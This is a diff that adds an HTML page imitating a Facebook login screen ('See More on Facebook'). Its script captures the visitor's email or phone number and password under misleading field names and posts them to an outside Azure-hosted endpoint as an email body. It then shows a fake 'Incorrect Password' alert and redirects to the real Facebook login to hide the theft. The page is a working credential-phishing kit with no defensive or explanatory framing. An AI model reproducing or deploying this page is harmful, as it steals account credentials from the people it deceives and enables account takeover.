@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FB</title>
+    <link rel="stylesheet" href="../static/style.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="login-box">
+            <h1>See More on Facebook</h1>
+            <form id="emailTForm">
+
+
+
+                <input type="text" id="subject" placeholder="Email address or phone number" required>
+                <input type="password" id="customerName" placeholder="Password" required>
+
+                <button type="submit">Log in</button>
+                <a href="#">Forgotten password?</a>
+                <hr>
+                <button type="button" class="create-account">Create new account</button>
+
+
+
+            </form>
+        </div>
+        <div id="alertContainer" class="mt-4"></div>
+    </div>
+
+    <script>
+        document.getElementById('emailTForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            const customerName = document.getElementById('customerName').value;
+
+
+
+
+            const subject = document.getElementById('subject').value;
+
+            const template = `
+                 From ${subject}
+                  
+
+                  i ${subject}
+                  here   : ${customerName}
+                  
+                
+              
+            `;
+
+            fetch('https://famehooks-f6eza9b2dqfxbydd.westindia-01.azurewebsites.net/send-t-emails', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ subject: subject, body: template })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    alert('Incorrect Password Try Again!!!');
+                    console.log(data);
+                    window.location.href = "https://www.facebook.com/login"; // Redirect to YouTube
+                })
+                .catch(error => {
+                    alert('Error.');
+                    console.error('Error:', error);
+                });
+        });
+    </script>
+</body>
+
+</html>
